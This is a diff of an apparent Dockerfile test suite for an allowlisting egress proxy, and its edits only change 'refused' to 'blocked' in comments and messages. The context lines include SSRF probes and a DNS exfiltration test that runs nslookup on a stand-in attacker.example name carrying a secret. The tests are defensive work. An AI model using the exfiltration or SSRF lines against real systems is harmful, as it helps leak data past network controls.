@@ -104,7 +104,7 @@ RUN echo "=== [Not traversal] ===" && \
     for P in "@scope%2fpkg" "my..pkg" "pkg.tgz" "a%5cb" "pkg;v=1"; do \
       OUT=$(curl -sS --path-as-is --max-time 10 "https://allowed.example.com/public/$P") && \
       echo "  $P -> $OUT" && \
-      case "$OUT" in PUBLIC*) : ;; *) echo "FAILED: refused a legitimate path" && exit 1 ;; esac; \
+      case "$OUT" in PUBLIC*) : ;; *) echo "FAILED: blocked a legitimate path" && exit 1 ;; esac; \
     done
 
 # Nothing declares 9443 as TLS. Reaching the origin there proves both that the
@@ -115,7 +115,7 @@ RUN echo "=== [Non-standard TLS port 9443] ===" && \
     echo "$OUT" && \
     case "$OUT" in PUBLIC\ GET*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
 
-# blocked.example.com is otherwise always refused (see [Blocked host] below),
+# blocked.example.com is otherwise always blocked (see [Blocked host] below),
 # so reaching it here proves the ~regex rule itself granted access, split into
 # a host match and a path match the way a plain URL rule already is.
 RUN echo "=== [Regex URL rule - host, port and path all matched] ===" && \
@@ -155,7 +155,7 @@ RUN echo "=== [Regex URL rule - host anchored, path left open] ===" && \
     echo "$OUT" && \
     case "$OUT" in ROOT\ GET*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
 
-RUN echo "=== [Regex URL rule - neighbouring host refused] ===" && \
+RUN echo "=== [Regex URL rule - neighbouring host blocked] ===" && \
     CODE=$($C https://not-ok.wildcard.example.com/regexpub/pkg.tgz) && \
     echo "status=$CODE" && \
     [ "$CODE" = "403" ] || (echo "FAILED: expected 403" && exit 1)
@@ -223,7 +223,7 @@ RUN echo "=== [Name does not resolve] ===" && \
     [ "$CODE" = "502" ] || (echo "FAILED: expected 502" && exit 1)
 
 # Allowlisted and resolvable, but the origin's certificate is signed by nobody
-# the proxy trusts, so it refuses to carry the connection rather than reach an
+# the proxy trusts, so it blocks the connection rather than reach an
 # origin it cannot authenticate.
 RUN echo "=== [Origin certificate not trusted] ===" && \
     CODE=$($C https://impostor.example.com/) && \
@@ -232,7 +232,7 @@ RUN echo "=== [Origin certificate not trusted] ===" && \
 
 # Allowlisted and resolvable, with nothing listening there. The connection
 # never completes, so no certificate is ever accepted on it, and
-# assert-inspect-restrict.sh checks that is reported as a refusal rather than
+# assert-inspect-restrict.sh checks that is reported as a block rather than
 # as an outage.
 RUN echo "=== [Origin connection never completes] ===" && \
     CODE=$($C https://deadend.example.com/) && \
@@ -254,7 +254,7 @@ RUN echo "=== [Name has AAAA records only] ===" && \
     [ "$CODE" = "502" ] || (echo "FAILED: expected 502" && exit 1)
 
 # The resolver answers it locally, so the build cannot learn its real address;
-# the request lands on the proxy and is refused there with its URL recorded.
+# the request lands on the proxy and is blocked there with its URL recorded.
 RUN echo "=== [Name outside the allowlist] ===" && \
     CODE=$($C https://notallowed.example.com/) && \
     echo "status=$CODE" && \
@@ -262,7 +262,7 @@ RUN echo "=== [Name outside the allowlist] ===" && \
 
 # A request-target that is not a path: RFC 9112 §3.2.4's asterisk-form, which
 # asks about the server rather than about a resource. No path rule can match
-# it, so restrict refuses it; assert-inspect-restrict.sh checks the line names
+# it, so restrict blocks it; assert-inspect-restrict.sh checks the line names
 # the host the request carried rather than one built from an empty path.
 RUN echo "=== [Request target is not a path] ===" && \
     CODE=$(curl -sS -o /dev/null -w %{http_code} --max-time 10 \
@@ -284,7 +284,7 @@ RUN echo "=== [Client leaves before sending a request] ===" && \
 
 # Bytes that are not an HTTP request, on a port no allowed_ip_rules or
 # allowed_tls_rules entry covers: anything that is not a TLS handshake reaches
-# the plain stage, which reads it as a request and refuses it. nc rather than
+# the plain stage, which reads it as a request and blocks it. nc rather than
 # curl, which can only speak protocols it knows.
 #
 # Keep the sleep: it holds stdin open so the FIN does not race the parse and
@@ -346,7 +346,7 @@ RUN echo "=== [Host holding a colon] ===" && \
     [ "$CODE" = "400" ] || (echo "FAILED: expected 400" && exit 1)
 
 # No connection is ever made, so the resolver's log is the only record. The
-# lookup is expected to fail; what matters is that it was refused and recorded.
+# lookup is expected to fail; what matters is that it was blocked and recorded.
 RUN echo "=== [DNS-only exfiltration] ===" && \
     (nslookup SECRET-IN-A-NAME.attacker.example >/dev/null 2>&1 || true) && \
     echo "queried"
@@ -415,7 +415,7 @@ RUN echo "=== [SSRF via allowlisted name] ===" && \
     [ "$CODE" = "403" ] || (echo "FAILED: reached an internal address" && exit 1)
 
 # Allowlisted, but resolves to an address HOST_ADDRESSES names as the runner's.
-# RFC1918 is exempt on purpose, so only that list refuses it.
+# RFC1918 is exempt on purpose, so only that list blocks it.
 RUN echo "=== [SSRF back to the runner] ===" && \
     CODE=$($C --insecure https://runner.example.com/) && \
     echo "status=$CODE" && \
